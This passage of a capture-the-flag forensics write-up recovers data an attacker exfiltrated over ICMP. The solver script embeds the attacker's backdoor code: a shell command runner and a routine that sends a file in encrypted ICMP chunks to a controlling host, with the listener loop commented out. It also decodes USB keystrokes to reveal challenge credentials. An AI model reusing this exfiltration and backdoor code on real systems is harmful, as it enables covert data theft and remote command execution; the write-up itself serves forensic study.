<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.py</div><div class="line">getfile:/tmp/intranet.pcap</div><div class="line">getfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRU</div><div class="line">getfile:3:8XB7Q94TDBClV8w4qhq69z3FZYrv8t2WgEKqgXrWdlHdlAFX8ALVsMhCJIBkRaym0tYdVp1SG4MaZR4Tss3uWqkUHUP2IHv2mxW9kJtXQcCFacZu6BB6WbVWAABCAAAAQgAAAAAMKUT6VQAMKT39sAgARQAANPb5QABABsB2wKgBAsCoAQEBu8YiHIz10SeSnX2AEADzDMEAAAEBCAoAJQRCAWpAmegQelnOVgAAjQAAAI0AAAAADCk9_bAADClE-lUIAEUAAH_bZ0AAQAbbvcCoAQHAqAECxiIBuyeSnX0cjPXRgBgA8YPFAAABAQgKAWpAowAlBEIUAwMAAQEWAwMAQGxEpdaDTXP8knA4zCtiwo73wxpiSMwEg4mUp0JHTM5EVi8fDHmJwxa4h0XRCtUMYW1ku3J8B2mDM4-Be7yzVgXoEHpZwVcAAEIAAABCAAAAAAwpRPpVAAwpPf2wCABFAAA09vpAAEAGwHXAqAECwKgBAQG7xiIcjPXRJ5KdyIAQAPMMbAAAAQEICgAlBEIBakCj6BB6WWhYAABcAQAAXAEAAAAMKUT6VQAMKT39sAgARQABTvb7QABABr9awKgBAsCoAQEBu8YiHIz10SeSnciAGADzZFwAAAEBCAoAJQRCAWpAoxYDAwDKBAAAxgAAASwAwAgdhAXn_d9KSZnZsG-gE9lS8acf1BQiUuNF04t4gevS8ICJtSUIJdGsE-qc2tSvQnLimi0T1iSzd47KHZC4nPZt8UmAPz8CvuPkoG2nSNnhtH7aG3vuLtigzX4okzcPOGpR</div><div class="line">getfile:15:TcpH8DKbQqyDTZP90vOPC7ZroVI7FBLP3tehUVdCsB5kcVOtOgwoeNuBDLMQwHANdbwLTIcc8rWzDtchd96wrcnYimMMVXom7hJFk9CYIvLi1AjgVnUmgijI_ZAvr768ZkMUK9zVD1CWi7x1yw-7a3r9XPaQAx4C_VXxF42RQ7lofpm0NeTW_RQddZVBmc7JRGHSyhhgvnPK9AvSftJCCR2w4U7ivYo3uXfyVBjkj2OnMPWtUeqWQxEMSVPnTp8pQ7CHG0ZhHzowGnNued80Q9s3cR5Dkb2EeAVtwoWObjMziRAuwahOsO88dbD0mOFbJMPNCQst5qOv0KkgXc4ArGuRdj3DqLdqZboIsRIFwk1BKxHoaBedqa8F8GR2t1RZ-xR31I5RSnJrJSn-v2ktPLitzNW5K46Ors604DI6pwH3GKv1moTI-Bc_S54n1WATXNYWBcE5T8_BxHPB6ezfXuuJK-Epgfu5UDMwkRCS84b0R5GT4gYdWLqOvIF0bJrLI1OgDT-ODRNIt_Ehq3jnXlV0gIwLr0nWLzGjDh4dhGdvNC1kylYtkzta6L-eBcnkDjKhyWMZa2pL6NN5iF2RaoKswfm_ZmBEygpY0s8VlBFf0Ut7s6D1vyUNiNEGwR8LZ13L4rxE4Cz51rFPeKFO80yWeYtXEyCz7idxVoT9cp_U8ospLrMcmalnXvZL4OGPzwT7G_dpZoZ6tMYRBKwgSn1KuyvmGlY9VGyQk16PqgpAk09-tmwlYJeEhPQGlrx-JpW6agdmeibUwsMZ0-oYJBhD0cvVwyOt</div><div class="line">getfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1</div><div class="line">getfile:165:cHurdwdnjePy6Xa5SBJU_Mbe1VPdwEuXvCW1XXCaId6Y09yNKbwX0W3KPWiTJ_ZgDoSKci1FZs9sK9gFobVoTOMBicG6atQrQ5TuoL-Er2T8HDGkhComD0AfHzgxHQRy5LbcUsRpMvLLJfsv0ULnwmfjcmk6RWT1IChIG7gUxie3xVnh9lFiOZlVFxFz_NB1JPlWpTqV-8c_tFM9tSk4ud7u4lMdjPgKPO-5eknyZiT8g5WbwDqteDdSuRAfYTl0A0EoEBqNr3wiRTxJJlhGVCWX70ki5CDNCNKMlK9YifFey6W2DMv4_5m616CWgLUNJTeowqqHWA2INCeLrn-dHZi-ADsKHNYoxEqIrJlpZCiUM5L-rOC_TtQ6COT7Aro7kaH1qdQkwgygg2qP6_Xe5mFO4IOMFkcx-51kDyjtfHUGBx2veXXEDfAScnKY9GY_905jJafZ9J8vRfeszHiD0quOv0edGw8NbKp3_pk2nL2Ey-vCIcm4lR0WXOFuOmwj67o6mk_cq2n7axOkJ8gcEc61AqJ7LzZbJFr0_b3bnaZzkXuKF_IokNRQJDpD1WfLkI_ba8Q3u2d8nui9ljBWs7VzwAl8dR1iH4QtIIturGVQEIR8jA3mn1evUTQvFjA-BN2nlOmXqyjoXU0HcaOC53Vj2d1r_J_64CmdAnlWJ-2aeG3dCoP0fYYxvKKpI1g6WXCX_Li701DtBTl6Hnp6ICHW7GEqxK96H0BfB_Sb6UQFa_9ScfbNd3ohC9xxYiiGSssqHiHkiAJ0vfYXSZYMs9YeTpSA273k</div><div class="line">...Truncated...</div></pre></td></tr></table></figure>
<p>We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see “getfile:/tmp/intranet.pcap” so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it’s actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!).<br>Our final python script will be:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">BS = <span class="number">16</span></div><div class="line">pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line">key2=<span class="string">"K8djhaIU8H2d1jNb"</span></div><div class="line">stri=<span class="string">"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ=="</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">( self, raw )</span>:</span></div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().read( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:<span class="number">16</span>]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(cmd)</span>:</span></div><div class="line">    ps = subprocess.Popen(cmd,shell=<span class="keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_ping</span><span class="params">(host, magic, data)</span>:</span></div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(L, n)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(L), n):</div><div class="line">        <span class="keyword">yield</span> L[i:i+n]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(host, magic, fn)</span>:</span></div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).read())</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, <span class="number">500</span>):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = <span class="keyword">True</span></div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># cipher = AESCipher(sys.argv[1])</span></div><div class="line"></div><div class="line"><span class="comment"># while True:</span></div><div class="line"><span class="comment">#     try: </span></div><div class="line"><span class="comment">#         pkts = sniff(filter="icmp", timeout =5,count=1)</span></div><div class="line"></div><div class="line"><span class="comment">#         for packet in pkts:</span></div><div class="line"><span class="comment">#              if  str(packet.getlayer(ICMP).type) == "8": </span></div><div class="line"><span class="comment">#                 input = packet[IP].load</span></div><div class="line"><span class="comment">#                 if input[0:len(magic)] == magic:</span></div><div class="line"><span class="comment">#                     input = input.split(":")</span></div><div class="line"><span class="comment">#                     data = cipher.decrypt(input[1]).split(":")</span></div><div class="line"><span class="comment">#                     ip = packet[IP].src</span></div><div class="line"><span class="comment">#                     if data[0] == "command":</span></div><div class="line"><span class="comment">#                         output = run_command(data[1])</span></div><div class="line"><span class="comment">#                         send_ping(ip, magic, "command:&#123;&#125;".format(output))</span></div><div class="line"><span class="comment">#                     if data[0] == "getfile":</span></div><div class="line"><span class="comment">#                         #print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line"><span class="comment">#                         get_file(ip, magic, data[1])</span></div><div class="line"><span class="comment">#     except:</span></div><div class="line"><span class="comment">#         pass</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#   break</span></div><div class="line"><span class="comment"># print(final)</span></div><div class="line"></div><div class="line"><span class="comment">#for i in range(0,301):</span></div><div class="line"><span class="comment">#   print(i, dicio[str(i)])</span></div><div class="line"><span class="comment"># for k,v in dicio.iteritems():</span></div><div class="line">    <span class="comment"># print(k, base64.urlsafe_b64decode(v))</span></div><div class="line"></div><div class="line"><span class="comment"># print(base64.urlsafe_b64decode(final))</span></div><div class="line"></div><div class="line">    <span class="comment"># if outp not in lis:</span></div><div class="line">    <span class="comment">#     # print(outp)</span></div><div class="line">        </div><div class="line">    <span class="comment">#     print(numb)</span></div><div class="line">    <span class="comment">#     lis.append(outp)</span></div><div class="line">        </div><div class="line">  <span class="comment"># lis = sorted(lis)</span></div><div class="line">  <span class="comment"># for it in lis:</span></div><div class="line">    <span class="comment"># print(it)</span></div><div class="line"></div><div class="line"></div><div class="line">dicio = &#123;&#125;</div><div class="line">lis = []</div><div class="line">n = AESCipher(key2)</div><div class="line">infile1=<span class="string">"encrypted1"</span></div><div class="line"><span class="keyword">with</span> open(infile1) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(strin),<span class="number">2</span>):</div><div class="line">    outp = n.decrypt(strin[i])</div><div class="line"></div><div class="line">infile2=<span class="string">"encrypted2"</span></div><div class="line"><span class="keyword">with</span> open(infile2) <span class="keyword">as</span> f:</div><div class="line">  strin = f.read().split(<span class="string">'SHA2017:'</span>)</div><div class="line">  strin = strin[<span class="number">1</span>:]</div><div class="line">  <span class="keyword">for</span> lin <span class="keyword">in</span> strin:</div><div class="line">    outp = n.decrypt(lin)</div><div class="line">    numb = re.findall(<span class="string">r"getfile:([0-9]+).*"</span>, outp)</div><div class="line">    outp = re.findall(<span class="string">r"getfile:[0-9]+:(.*)"</span>, outp)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> numb != []:</div><div class="line">      <span class="keyword">if</span> dicio.has_key(numb[<span class="number">0</span>]):</div><div class="line">        dicio[numb[<span class="number">0</span>]].append(outp[<span class="number">0</span>])</div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        dicio[numb[<span class="number">0</span>]]=[outp[<span class="number">0</span>]]</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">    final=<span class="string">""</span>    </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">301</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            final += base64.urlsafe_b64decode(dicio[str(i)][j])</div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    file = open(<span class="string">'lol%d.pcap'</span>%j,<span class="string">'wb+'</span>)</div><div class="line">    file.write(final)</div></pre></td></tr></table></figure>
<p>Now checking intranet.pcap we could see that we have more encrypted data but in this case was TLS, and then we remembered after we decrypted abuse2.cap we got our RSA.keys to decrypt these packages! so once again using wireshark to decrypt:<br>Edit -&gt; Preferences -&gt; protocols -&gt; SSL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol1.pcap intranet.pcap</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark intranet.pcap</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/v2aJGf3.png" title="Decrypt TLS"></p>
<p>Now seeing HTTP packages we can see that the hacker downloaded file secret.zip!<br><img src="https://i.imgur.com/DhQKSaT.png" title="Export ZIP"></p>
<p>The zip file is protected by a password! now we either bruteforce the zip file (which was a very hard way to do it since the password was “somehow” complicated) or we needed to find it in our USB capture! which is a USB keyboard capture!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; mv lol4.pcap usb.pcap</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; wireshark usb.pcap</div></pre></td></tr></table></figure>
<p>Extract the keys pressed from the usb.cap:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r usb.pcap -Y <span class="string">"frame.len==72"</span> -Tfields -e usb.capdata &gt; usb.txt</div></pre></td></tr></table></figure>
<p>And now getting the table to decode the keys from <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a><br><img src="https://i.imgur.com/u6IBaE4.png" title="keyboard table"></p>
<p>Writting the script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">shift = <span class="string">"02:00:00:00:00:00:00:00"</span></div><div class="line">ignore = <span class="string">"00:00:00:00:00:00:00:00"</span></div><div class="line">ignore2 = <span class="string">"01:00:00:00:00:00:00:00"</span></div><div class="line">keys_dict = &#123;<span class="string">'04'</span>: <span class="string">'a'</span>,</div><div class="line">       <span class="string">'05'</span>: <span class="string">'b'</span>,</div><div class="line">       <span class="string">'06'</span>: <span class="string">'c'</span>,</div><div class="line">       <span class="string">'07'</span>: <span class="string">'d'</span>,</div><div class="line">       <span class="string">'08'</span>: <span class="string">'e'</span>,</div><div class="line">       <span class="string">'09'</span>: <span class="string">'f'</span>,</div><div class="line">       <span class="string">'0a'</span>: <span class="string">'g'</span>,</div><div class="line">       <span class="string">'0b'</span>: <span class="string">'h'</span>,</div><div class="line">       <span class="string">'0c'</span>: <span class="string">'i'</span>,</div><div class="line">       <span class="string">'0d'</span>: <span class="string">'j'</span>,</div><div class="line">       <span class="string">'0e'</span>: <span class="string">'k'</span>,</div><div class="line">       <span class="string">'0f'</span>: <span class="string">'l'</span>,</div><div class="line">       <span class="string">'10'</span>: <span class="string">'m'</span>,</div><div class="line">       <span class="string">'11'</span>: <span class="string">'n'</span>,</div><div class="line">       <span class="string">'12'</span>: <span class="string">'o'</span>,</div><div class="line">       <span class="string">'13'</span>: <span class="string">'p'</span>,</div><div class="line">       <span class="string">'14'</span>: <span class="string">'q'</span>,</div><div class="line">       <span class="string">'15'</span>: <span class="string">'r'</span>,</div><div class="line">       <span class="string">'16'</span>: <span class="string">'s'</span>,</div><div class="line">       <span class="string">'17'</span>: <span class="string">'t'</span>,</div><div class="line">       <span class="string">'18'</span>: <span class="string">'u'</span>,</div><div class="line">       <span class="string">'19'</span>: <span class="string">'v'</span>,</div><div class="line">       <span class="string">'1a'</span>: <span class="string">'w'</span>,</div><div class="line">       <span class="string">'1b'</span>: <span class="string">'x'</span>,</div><div class="line">       <span class="string">'1c'</span>: <span class="string">'y'</span>,</div><div class="line">       <span class="string">'1d'</span>: <span class="string">'z'</span>,</div><div class="line">       <span class="string">'1e'</span>: <span class="string">'1'</span>,</div><div class="line">       <span class="string">'1f'</span>: <span class="string">'2'</span>,</div><div class="line">       <span class="string">'20'</span>: <span class="string">'3'</span>,</div><div class="line">       <span class="string">'21'</span>: <span class="string">'4'</span>,</div><div class="line">       <span class="string">'22'</span>: <span class="string">'5'</span>,</div><div class="line">       <span class="string">'23'</span>: <span class="string">'6'</span>,</div><div class="line">       <span class="string">'24'</span>: <span class="string">'7'</span>,</div><div class="line">       <span class="string">'25'</span>: <span class="string">'8'</span>,</div><div class="line">       <span class="string">'26'</span>: <span class="string">'9'</span>,</div><div class="line">       <span class="string">'27'</span>: <span class="string">'0'</span>,</div><div class="line">       <span class="string">'28'</span>: <span class="string">'\r\n'</span>,</div><div class="line">       <span class="string">'29'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2a'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2b'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'2c'</span>: <span class="string">' '</span>,</div><div class="line">       <span class="string">'2d'</span>: <span class="string">'-'</span>,</div><div class="line">       <span class="string">'2e'</span>: <span class="string">'='</span>,</div><div class="line">       <span class="string">'2f'</span>: <span class="string">'['</span>,</div><div class="line">       <span class="string">'30'</span>: <span class="string">']'</span>,</div><div class="line">       <span class="string">'31'</span>: <span class="string">'\\'</span>,</div><div class="line">       <span class="string">'32'</span>: <span class="string">'#'</span>,</div><div class="line">       <span class="string">'33'</span>: <span class="string">':'</span>,</div><div class="line">       <span class="string">'34'</span>: <span class="string">"'"</span>,</div><div class="line">       <span class="string">'35'</span>: <span class="string">''</span>,</div><div class="line">       <span class="string">'36'</span>: <span class="string">','</span>,</div><div class="line">       <span class="string">'37'</span>: <span class="string">'.'</span>,</div><div class="line">       <span class="string">'38'</span>: <span class="string">'/'</span>&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'usb.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">  keys_lines = f.readlines()</div><div class="line">  s = <span class="string">""</span></div><div class="line">  <span class="keyword">for</span> key <span class="keyword">in</span> keys_lines:</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> key.strip() == shift <span class="keyword">or</span> key.strip() == ignore <span class="keyword">or</span> key.strip() == ignore2:</div><div class="line">      <span class="keyword">continue</span></div><div class="line">    k=key.split(<span class="string">":"</span>)</div><div class="line">    <span class="comment">#print key == ignore, key == '02:00:00:00:00:00:00:00', key</span></div><div class="line">    <span class="keyword">if</span> k[<span class="number">0</span>] == <span class="string">'02'</span>: <span class="comment">#shift pressed </span></div><div class="line">      <span class="keyword">if</span> keys_dict[k[<span class="number">2</span>]] == <span class="string">'2'</span>:</div><div class="line">        s  += <span class="string">'@'</span></div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        s += keys_dict[k[<span class="number">2</span>]].upper()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      s += keys_dict[k[<span class="number">2</span>]]</div><div class="line">  <span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; python usb.py</div><div class="line">root</div><div class="line">Welcome123</div><div class="line">ls -la</div><div class="line">curl -ks https://root:Welcome123@intranet/secret.zip</div><div class="line">unzip secret.zip</div><div class="line">Pyj4m4P4rtY@2017</div><div class="line">cat secret.txt</div><div class="line">display hamburg</div><div class="line">logoout</div></pre></td></tr></table></figure>
